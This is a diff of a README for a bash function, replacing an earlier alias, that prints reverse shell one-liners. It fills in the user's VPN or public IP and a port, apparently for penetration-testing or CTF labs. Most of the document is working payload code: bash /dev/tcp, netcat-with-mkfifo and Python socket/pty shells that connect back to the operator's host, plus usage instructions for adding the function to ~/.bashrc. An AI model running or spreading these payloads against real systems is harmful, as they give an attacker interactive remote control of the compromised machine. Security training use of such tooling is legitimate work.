@@ -1,6 +1,7 @@
 # Set a Bash Alias for Common Reverse Shell's
 ```bash
-alias reverse="arg1=\$(ip -f inet addr show tun0 | grep -Po 'inet \K[\d.]+'); printf \"bash -i >& /dev/tcp/\$arg1/9001 0>&1\"; printf \"\n\nnc -e /bin/sh \$arg1 9001\"; printf \"\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc \$arg1 9001 >/tmp/f\";printf \"\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"\$arg1\\\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"/bin/bash\\\")'\n\n\""
+function reverse { local port=443;adaptors=$(ip a | egrep ^[0-9]+ | cut -d" " -f 2 | sed 's/://g');OPTIND=1;usage()( echo "reverse [-i <interface>] [-l <language>] [-p <port>]";printf "Language Options:\n  bash\n  nc\n  python\n\n" );while getopts ":i:l:p:h" options; do case "${options}" in i)local interface=${OPTARG};if ! echo $interface |  egrep -qo "public"; then if ! echo $adaptors | grep -qo "$interface"; then echo "Interface "${OPTARG}" does not exist";usage;return;fi;fi;;l)local language=${OPTARG};;     p)local port=${OPTARG};;h)usage;return;;:)echo "Error: -${OPTARG} requires an argument";usage;return;;*)echo "Unknown Switch: -${OPTARG}";usage;return;;esac;done;if [ -z $interface ]; then if ip a | egrep -qo "tun0"; then local interface="tun0";elif echo $interface | egrep -qo "public" ; then local interface="public";elif ip a | egrep -qo "eth0"; then local interface="eth0";elif ip a | egrep -qo "ens33"; then local interface="ens33";else local interface="lo";fi;fi;if echo $interface | egrep -qo "public"; then local ip=$(wget -qO - icanhazip.com);else local ip=$(ip a show $interface | egrep -o "([0-9]{1,3}\.){3}[0-9]{1,3}" | head -1);fi;local randName=$(head -4 /dev/urandom | sha256sum | base64 | head -c 5);declare -A shells=( ["bash"]="bash -i >& /dev/tcp/$ip/$port 0>&1" ["nc"]="mkfifo /tmp/$randName; nc $ip $port 0</tmp/$randName | /bin/sh >/tmp/$randName 2>&1; rm /tmp/$randName" ["python"]="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" );if [ -z $language ]; then printf "\n";for i in "${shells[@]}";do printf "$i\n\n";done;return;fi;printf "\n${shells[$language]}\n\n"; }
+
 ```
 # Instructions
 <br>
@@ -8,15 +9,28 @@ alias reverse="arg1=\$(ip -f inet addr show tun0 | grep -Po 'inet \K[\d.]+'); pr
 <br>
 • 2. copy and paste the above text (see screenshot)
 <br>
-• 3. save, then open a new terminal and type "<b>reverse</b>"
+• 3. save, then open a new terminal and type "<b>reverse -h</b>"
+<br>
+• 4. the function will default to your tun0 IP 
+
+# Usage
+
+```
+reverse -h
+
+reverse -i tun0 -p 9001
+
+reverse -i public -p 9001
+```
 
 # Screenshots
 <i>~/.bashrc</i>
-<img src="https://i.imgur.com/4gWwukP.png">
+<img src="https://i.imgur.com/9AtWWvn.png">
 <br>
 <i>running the alias</i>
-<img src="https://i.imgur.com/SSu6L0r.png">
+<img src="https://i.imgur.com/muKxjaf.png">
 <br>
+<img src="https://i.imgur.com/xvULtzH.png">
 <br>
 <b>Please feel free to modify this!</b>
 <br>
